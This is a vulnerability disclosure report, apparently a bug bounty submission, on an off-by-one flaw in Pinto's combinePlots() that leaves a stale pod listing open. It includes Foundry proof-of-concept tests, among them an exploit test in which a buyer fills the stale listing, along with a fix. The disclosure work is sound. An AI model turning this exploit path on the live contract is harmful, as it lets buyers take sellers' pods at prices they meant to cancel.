# D-006 — combinePlots() Fails to Cancel Pod Listing on plotIndexes[0] (Pinto / Beanstalk Fork)

**Program:** Pinto (Immunefi)  
**Contract:** `FieldFacet.sol` — `combinePlots()`  
**Severity:** Medium  
**PoC:** Forge — 3/3 tests pass  
**Testing date:** 2026-05-24

---

## TL;DR

`combinePlots()` merges adjacent plots into one. The loop that cancels pod listings starts at `i = 1`, skipping `plotIndexes[0]`. If the seller has an active listing on their first plot and calls `combinePlots()`, the listing persists in storage after the combine. A buyer (or MEV bot) can then fill the stale listing and acquire the seller's pods at a price the seller intended to cancel — a direct financial loss for the seller.

---

## Root Cause

```solidity
// FieldFacet.sol — combinePlots()
uint256 totalPods = s.accts[account].fields[fieldId].plots[plotIndexes[0]];
require(totalPods > 0, "Field: Plot not owned by caller");

for (uint256 i = 1; i < plotIndexes.length; i++) { // ← BUG: starts at i=1
    // cancel listing if one exists for this plot
    if (s.sys.podListings[fieldId][plotIndexes[i]] != bytes32(0)) {
        LibMarket._cancelPodListing(account, fieldId, plotIndexes[i]);
    }
    // ... merge logic ...
}

// plotIndexes[0] listing is NEVER checked or cancelled
s.accts[account].fields[fieldId].plots[plotIndexes[0]] = totalPods;
```

The listing cancellation check runs for `plotIndexes[1], [2], ..., [n]`. `plotIndexes[0]` is handled before the loop, but the listing cancellation is missing from that pre-loop block.

---

## Impact

When a seller has an active listing on `plotIndexes[0]` and calls `combinePlots()`:

1. They expect all listings to be cancelled — the function comment and PR #179 indicate this intent.
2. The listing on `plotIndexes[0]` remains with its original `podAmount` (before the combine).
3. The combined plot now holds `podsA + podsB` pods at `plotIndexes[0]`, but the listing only covers `podsA`.
4. A buyer can `fillPodListing()` against the stale listing immediately, purchasing `podsA` pods at the seller's old price.
5. The seller receives beans at a price they intended to cancel. If market prices moved, the seller suffers a financial loss relative to their intended re-listing price.

---

## Asymmetry Proof

The key signal: `plotIndexes[1]` listings ARE correctly cancelled. `plotIndexes[0]` is NOT.

```solidity
// After combinePlots([indexA, indexB]) where both have active listings:
assertEq(getPodListing(fieldId, indexB), bytes32(0));    // indexB: CANCELLED ✓
assertNotEq(getPodListing(fieldId, indexA), bytes32(0)); // indexA: NOT cancelled ← BUG
```

---

## Proof of Concept (Foundry)

```solidity
// Test 1 — Bug confirmation
function test_combinePlots_doesNotCancelFirstPlotListing() public {
    // Create listings on both plots
    vm.prank(seller);
    bs.createPodListing(PodListing({index: indexA, podAmount: podsA, pricePerPod: 500_000, ...}));

    // Listing exists before combine
    assertNotEq(bs.getPodListing(fieldId, indexA), bytes32(0));

    // Combine — seller expects listing to be cancelled
    vm.prank(seller);
    bs.combinePlots(fieldId, [indexA, indexB]);

    // Listing persists — BUG
    assertNotEq(bs.getPodListing(fieldId, indexA), bytes32(0)); // PASS — BUG CONFIRMED
}

// Test 2 — Exploit
function test_combinePlots_buyerFillsStaleListingAfterCombine() public {
    // [setup: seller creates listing on indexA, calls combinePlots]

    uint256 cost = (podsA * 500_000) / 1_000_000;
    vm.prank(buyer);
    bs.fillPodListing(staleListing, cost, 0); // SUCCESS — pods purchased at seller's old price
}

// Test 3 — Asymmetry
function test_combinePlots_doesCancelSecondPlotListing() public {
    // [setup: listings on both indexA and indexB]
    vm.prank(seller);
    bs.combinePlots(fieldId, [indexA, indexB]);

    assertEq(bs.getPodListing(fieldId, indexB), bytes32(0));    // indexB: cancelled ✓
    assertNotEq(bs.getPodListing(fieldId, indexA), bytes32(0)); // indexA: not cancelled ← bug
}
```

**Forge output:**
```
[PASS] test_combinePlots_doesNotCancelFirstPlotListing()      (gas: 737288)
[PASS] test_combinePlots_doesCancelSecondPlotListing()         (gas: 832571)
[PASS] test_combinePlots_buyerFillsStaleListingAfterCombine() (gas: 994772)
Suite result: ok. 3 passed; 0 failed
```

---

## Recommended Fix

Add the listing cancellation check for `plotIndexes[0]` before the loop, mirroring the pattern for subsequent plots:

```solidity
function combinePlots(uint256 fieldId, uint256[] calldata plotIndexes) external ... {
    address account = LibTractor._user();
    uint256 totalPods = s.accts[account].fields[fieldId].plots[plotIndexes[0]];
    require(totalPods > 0, "Field: Plot not owned by caller");

    // FIX: add this block (was missing)
    if (s.sys.podListings[fieldId][plotIndexes[0]] != bytes32(0)) {
        LibMarket._cancelPodListing(account, fieldId, plotIndexes[0]);
    }

    uint256 expectedNextStart = plotIndexes[0] + totalPods;

    for (uint256 i = 1; i < plotIndexes.length; i++) {
        // existing logic — already correct for i >= 1
    }
}
```

One-line fix (plus the `require`). Consistent with the existing pattern.

---

## Lessons Learned

- **"Loop starts at 1" is a common off-by-one class.** Whenever a loop starts at `i=1` and the `i=0` case is handled separately, check whether every action inside the loop should also apply to `i=0`.
- **Asymmetry is the proof.** "This happens for plots[1] but not plots[0]" is cleaner evidence than "the listing persists." It proves the loop logic is the root cause, not some other mechanism.
- **MEV bots monitor mempool for listing fills.** A stale listing that appears in the mempool (when `combinePlots` doesn't cancel it) is immediately visible to MEV bots. The window between combine and victim noticing is not safe.
- **Beanstalk forks inherit the same patterns.** Pinto is derived from Beanstalk. The pod market (`createPodListing`, `fillPodListing`) is a Beanstalk primitive. Any fork that adds `combinePlots` without inheriting the full listing-cancel logic from an upstream patch is vulnerable.
